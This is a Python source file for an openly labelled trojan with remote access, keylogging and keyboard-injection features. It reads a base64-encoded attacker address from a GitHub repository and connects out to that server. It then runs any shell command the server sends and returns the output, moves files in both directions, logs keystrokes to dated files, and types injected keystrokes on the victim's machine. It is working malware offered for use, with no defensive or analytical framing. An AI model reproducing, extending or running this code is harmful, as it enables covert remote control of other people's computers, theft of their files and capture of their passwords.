import socket 
import threading 
import os 
import subprocess 
import time 
import pyautogui 
import requests 
import base64
from datetime import datetime
from pynput.keyboard import Listener



############################ connecting to server ###################################################

def server_ip(repo):
	r   = requests.get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
	req = bytes(r.json()['content'],encoding='utf-8')
	host,port=base64.decodebytes(req).decode('utf8').split(':')
	return host,int(port)

	
def reconnect():
	pass

############################ connecting to server ###################################################
























############################# MESSING WITH THIER FILES! #############################################



def recv_b_file(name,size=1024):
	with open(name,'wb') as f:
		while True:
			file_contents = client.recv(size)

			if not file_contents:
				break
			else:
				f.write(file_contents)

			client.send('s'.encode('utf-8'))
	print('done')


def send_b_file(path,size=1024):
	file = open(path,'rb')

	file_contents = file.read(size)
	file_contents=bytearray(file_contents)

	while len(file_contents)>0:
		try:
			client.send(file_contents)
			file_contents = file.read(size)
			file_contents=bytearray(file_contents)
			client.recv(1024).decode('utf-8')
		except Exception as err:
			print(err)

	file.close()
	print('done')



def recv_t_file(name,size=1024):
	with open(name,'wb') as f:
		while True:
			file_contents = client.recv(size).decode('utf-8')

			if not file_contents:
				break
			else:
				f.write(file_contents)

			client.send('s'.encode('utf-8'))
	print('done')


def send_t_file(path,size=1024):
	file = open(path,'r')
	file_contents = file.read(size)

	while len(file_contents)>0:
		try:
			client.send(file_contents).encode('utf-8')
			file_contents = file.read(size)
			client.recv(1024).decode('utf-8')
		except Exception as err:
			print(err)

	file.close()
	print('done')



############################# MESSING WITH THIER FILES! #############################################























########################## HACKING SCRIPTS ###########################################################


def keyboard(option,size=1024):
	if option==1:
		while True:
			file_contents = client.recv(size).decode('utf-8')

			if not file_contents:
				break
			else:
				for i in file_contents:
					pyautogui.typewrite(i)

			client.send('s'.encode('utf-8'))

		print('done')


	elif option==2:
		while True:
			string = client.recv(size).decode('utf-8')
			if string=='exit':
				return


			elif '~' in string:
				hot_keys = []
				words = string.split('~')

				for word in words:
					if word in hot_keys:
						hkey = word.split('+')[0]
						if len(hkey.split('+'))>1 and word.split('+')[0]!='':
							pyautogui.hotkey(*word.split('+'))
						else:
							pyautogui.keyDown(hkey.replace('+',''))

					else:
						for char in word:
							pyautogui.typewrite(char)



			else:
				for i in string:
					pyautogui.typewrite(i)







def keylogger(finish_time):
	string = ''
	file_name = str(datetime.today().date())+'.txt'
	path = os.path.join('logs',file_name)

	def write(key):
		nonlocal l,string
		key=str(key)
		with open(path,'a') as f:
			if datetime.now().minute >= finish_time:
				f.write(string+'\n')
				l.stop()
			else:
				if key=='Key.enter':
					f.write(string+'\n')
					string=''

				elif key=='Key.space':
					string+=' '
	
				elif 'Key' in key:
					string+='~'+key+'~'

				else:
					string+=key.replace("'","")

	with Listener(on_press=write) as l:
		if 'logs' not in os.listdir():
			os.mkdir('logs')
		l.join()
















########################## HACKING SCRIPTS ###########################################################




























def trojan():
	global client
	HOST,PORT = server_ip('server_address')

	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	while True:
		server_command = client.recv(1024).decode('utf-8')

		if server_command=='send binary file':
			name = client.recv(1024).decode('utf-8')
			recv_b_file(name,102400)

		elif server_command=='send text file':
			name = client.recv(1024).decode('utf-8')
			recv_t_file(name,102400)

		elif server_command=='recieve binary file':
			path = client.recv(1024).decode('utf-8')
			send_b_file(path,102400)

		elif server_command=='recieve text file':
			path = client.recv(1024).decode('utf-8')
			send_t_file(path,102400)








		elif server_command[:2]=='cd':
			os.chdir(server_command.split()[1])
			client.send(os.getcwd().encode('utf-8'))

		elif server_command=='pwd':
			client.send(os.getcwd().encode('utf-8'))

		elif server_command=='keyboard access':
			option=int(client.recv(1024).decode('utf-8'))
			keyboard(option)
			break

		else:
			p1=subprocess.run(server_command,shell=True,capture_output=True,text=True)
			client.send(p1.stdout.encode('utf-8'))


		client.send('\ncommand was executed\n'.encode('utf-8'))








trojan()